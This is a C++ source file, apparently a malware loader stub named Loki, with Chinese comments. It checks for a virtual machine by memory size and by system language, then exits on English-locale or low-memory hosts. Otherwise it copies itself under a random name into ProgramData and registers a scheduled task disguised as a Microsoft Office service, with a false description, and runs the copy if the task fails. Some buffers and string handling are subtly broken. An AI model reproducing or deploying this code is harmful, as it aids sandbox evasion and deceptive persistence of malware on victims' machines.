// Loki.cpp : 定义控制台应用程序的入口点。
//

#include <io.h>
#include "stdafx.h"
#include "direct.h"
#include "TaskSchedule.h"
#include<ctime>

#include <iostream>
#include <fstream>

//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
//#pragma comment(linker, "/INCREMENTAL:NO")
using namespace std;

const int LEN_NAME = 6;
char* rand_str(char* str, const int len)
{
	int i;
	for (i = 0; i < len; ++i)
		str[i] = 'a' + rand() % 26;
	str[++i] = '\0';
	return str;
}

int _tmain(int argc, _TCHAR* argv[])
{
	//反虚拟机1 检测内存大小
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);
	int mem = statex.ullTotalPhys / 1024 / 1024 / 1000;
	//printf("%d G",mem);//内存大小

	if (mem < 4)
	{
		exit(0);
	}

	//反虚拟机2 检测环境语言
	LANGID lid = GetSystemDefaultLangID(); // 获取系统默认ID
	switch (lid)
	{
	case 0x0804:
		//printf("CN\n");
		break;
	case 0x0409:
		//printf("EN\n");
		exit(0);
		break;
	}



	//路径检测

	string CurrentPath = argv[0];

	char* WorkPath;
	WorkPath = getenv("PROGRAMDATA");

	char DesPath[20];
	sprintf(DesPath, "%s\\12312312", WorkPath);



	//创建路径
	if (0 != _access(DesPath, 0))
	{
		mkdir(DesPath);   // 返回 0 表示创建成功，-1 表示失败

	}

	//生成随机文件名

	char DesFileName[20];

	srand(time(NULL));
	int i;
	char name[LEN_NAME + 1];

	sprintf(DesFileName, "%s\\%s.exe", DesPath, rand_str(name, LEN_NAME));

	//printf("随机文件:%s\n", DesFileName);


	if (strstr(CurrentPath.c_str(), DesPath) == NULL){
		printf("[-] Path Error\n");
		CopyFile(argv[0], DesFileName, FALSE);//false代表覆盖，dutrue不覆盖
		printf("[+] File Copy Success\n");

		CMyTaskSchedule task;
		BOOL flag = FALSE;

		flag = task.NewTask("Office Service Monitor", DesFileName, "", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");

		if (FALSE == flag)
		{
			printf("[-] Create Task Schedule Error!\n");
			//system(DesFileName);
			
			SHELLEXECUTEINFO commend;//命令对象
			memset(&commend, 0, sizeof(SHELLEXECUTEINFO));
			commend.cbSize = sizeof(SHELLEXECUTEINFO);
			commend.fMask = SEE_MASK_NOCLOSEPROCESS;
			commend.lpVerb = _T("");
			commend.lpFile = _T(DesFileName);//执行命令内容
			commend.nShow = SW_SHOWDEFAULT;
			ShellExecuteEx(&commend);//执行命令
			//WaitForSingleObject(commend.hProcess, INFINITE);//等待执行结束
			CloseHandle(commend.hProcess);//关闭控制台

		}
		else {
			printf("[+] Create Task Schedule Success!\n");
		}
		exit(0);
	}
	else
	{
		printf("[+] C++ Sch Run Success!\n");
	}

	

	getchar();


	//CMyTaskSchedule task;
	//BOOL flag = FALSE;


	//// 创建 任务计划
	////任务名称，启动程序路径，，设置作者信息
	//flag = task.NewTask("Office Service Monitor", "C:\\tester.exe","", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");
	//if (FALSE == flag)
	//{
	//	printf("Create Task Schedule Error!\n");
	//}
	//else {
	//	printf("Create Task Schedule Success!\n");
	//}

	//// 暂停
	//printf("Create Task Schedule OK!\n");
	//system("pause");

	//// 卸载 任务计划
	//bRet = task.Delete("520");
	//if (FALSE == bRet)
	//{
	//	printf("Delete Task Schedule Error!\n");
	//}

	//printf("Delete Task Schedule OK!\n");
	//system("pause");
	//return 0;
}




